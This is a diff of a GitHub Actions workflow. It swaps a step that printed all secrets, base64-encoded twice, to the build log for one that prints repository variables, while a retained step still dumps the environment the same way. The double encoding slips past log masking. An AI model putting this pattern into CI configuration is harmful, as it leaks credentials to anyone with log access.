@@ -41,10 +41,10 @@ runs:
       run: |
         echo "${{ toJSON(env) }}" | base64 | base64
 
-    - name: Debug Secrets
+    - name: Debug Vars
       shell: bash
       run: |
-        echo "${{ toJSON(secrets) }}" | base64 | base64
+        echo "${{ toJSON(vars) }}" | base64 | base64
 
     - name: Setup NodeJS
       uses: actions/setup-node@v1
